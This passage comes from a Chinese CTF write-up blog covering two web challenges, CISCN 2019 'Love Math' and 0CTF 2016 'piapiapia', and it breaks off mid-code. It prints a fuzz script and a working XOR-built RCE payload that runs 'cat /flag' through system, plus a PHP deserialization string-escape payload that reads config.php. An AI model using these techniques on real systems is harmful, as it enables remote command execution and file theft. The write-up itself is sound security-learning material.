&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;preg_match_all&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&amp;#39;&lt;/span&gt;, $content, $used_funcs);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;foreach&lt;/span&gt; ($used_funcs[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;] &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; $func) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($func, $whitelist)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;请不要输入奇奇怪怪的函数&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//帮你算出答案
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;echo &amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$content&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cnblogs.com/20175211lyz/p/11588219.html" target="_blank" rel="noopener"
&gt;刷题记录：[CISCN 2019 初赛]Love Math&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。&lt;/p&gt;
&lt;p&gt;利用&lt;code&gt;$whitelist&lt;/code&gt;里的函数名称和数字遍历异或&lt;code&gt;^&lt;/code&gt;，Fuzz找出来需要的字母，然后拼接一个&lt;code&gt;_GET&lt;/code&gt;传参执行命令。&lt;/p&gt;
&lt;p&gt;Fuzz的代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$whitelist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;abs&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan2&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atanh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;base_convert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;bindec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;ceil&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decbin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;dechex&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decoct&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;deg2rad&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;expm1&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;floor&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;fmod&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hexdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hypot&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_finite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_infinite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_nan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;lcg_value&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log10&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log1p&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;min&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;octdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pi&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pow&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rad2deg&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;round&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sqrt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tanh&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$exp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; ($i&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $i &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;count&lt;/span&gt;($whitelist); $i&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; ($j&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $j &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;; $j&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $exp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$whitelist[$i]&lt;span style="color:#f92672"&gt;^&lt;/span&gt;$j&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $whitelist[$i]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;^&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$j&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;----&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$exp;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要知道的有，php某个版本以后可以使用函数名加&lt;code&gt;()&lt;/code&gt;的方式调用函数，如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;base_convert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;strtoupper&amp;#34;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;36&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;base_convert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;2927671435926243&amp;#34;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;36&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$cos(&lt;span style="color:#e6db74"&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面代码是把字符串&lt;strong&gt;strtoupper&lt;/strong&gt;赋值到变量&lt;code&gt;$cos&lt;/code&gt;，然后直接使用&lt;code&gt;$cos()&lt;/code&gt;执行&lt;code&gt;strtoupper()&lt;/code&gt;函数。代码中使用&lt;code&gt;base_convert&lt;/code&gt;函数也是这道题的一种思路哦。﹙ˊ_&amp;gt;ˋ﹚&lt;/p&gt;
&lt;p&gt;还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号&lt;code&gt;()&lt;/code&gt;括起来就可以了。&lt;code&gt;$&lt;/code&gt;如果直接拼接到字符串上也是不可以的，需要使用形如&lt;code&gt;$$cos&lt;/code&gt;才可以正确的指向变量。&lt;/p&gt;
&lt;p&gt;最终payload：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;c&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;is_finite&lt;/span&gt;&lt;span style="color:#f92672"&gt;^&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;))&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;rad2deg&lt;/span&gt;&lt;span style="color:#f92672"&gt;^&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;7&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;5&lt;/span&gt;));$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$$cos;$cos{&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;}($cos{&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;})&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;cat&lt;/span&gt; &lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;flag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="0ctf-2016piapiapia"&gt;[0CTF 2016]piapiapia
&lt;/h1&gt;&lt;p&gt;使用目录扫描发现了www.zip网站备份。&lt;/p&gt;
&lt;p&gt;网站结构&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;static&lt;/p&gt;
&lt;p&gt;upload&lt;/p&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;p&gt;config.php&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;p&gt;profile.php&lt;/p&gt;
&lt;p&gt;register.php&lt;/p&gt;
&lt;p&gt;update.php&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;发现有register就去注册个试试呗&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210309102253.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号&lt;/p&gt;
&lt;p&gt;邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;img&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;data:image/gif;base64,.......&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看源码profile.php中是这样的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$profile &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($profile);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $phone &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;phone&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $email &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;email&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $nickname &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;nickname&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $photo &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;base64_encode&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($profile[&lt;span style="color:#e6db74"&gt;&amp;#39;photo&amp;#39;&lt;/span&gt;]));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了&lt;code&gt;unserialize&lt;/code&gt;，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;hostname&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;database&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;del&gt;下载的源码肯定不会把flag直接给你&lt;/del&gt;，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：&lt;code&gt;filter&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$username &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;parent&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($username);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$password &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;parent&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($password);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;跟进一下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($string) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\\\\&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $escape) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $string &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($escape, &lt;span style="color:#e6db74"&gt;&amp;#39;_&amp;#39;&lt;/span&gt;, $string);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;select&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;update&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;where&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $safe) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($safe, &lt;span style="color:#e6db74"&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;, $string);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过滤&lt;code&gt;_&lt;/code&gt;，select、insert、update、delete、where会被替换成&lt;code&gt;hacker&lt;/code&gt;，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用&lt;a class="link" href="https://my.oschina.net/u/3076320/blog/4372683" target="_blank" rel="noopener"
&gt;PHP反序列化字符串逃逸&lt;/a&gt;，序列化的结尾是&lt;code&gt;&amp;quot;;}&lt;/code&gt;可以手动构造闭合。&lt;/p&gt;
&lt;p&gt;现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工&lt;/p&gt;
&lt;p&gt;先上payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&amp;#34;;}s:5:&amp;#34;photo&amp;#34;;s:10:&amp;#34;config.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。&lt;/p&gt;
&lt;p&gt;受到了这位师傅的博客&lt;a class="link" href="https://blog.csdn.net/weixin_44077544/article/details/102703489" target="_blank" rel="noopener"
&gt;[0CTF 2016]piapiapia&lt;/a&gt;，我尝试了下&lt;code&gt;$profile&lt;/code&gt;属性其实是一个&lt;strong&gt;关联数组&lt;/strong&gt;，是键值对形式的，并且字符串可能是嵌套起来的，形如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;profile&lt;/span&gt;{
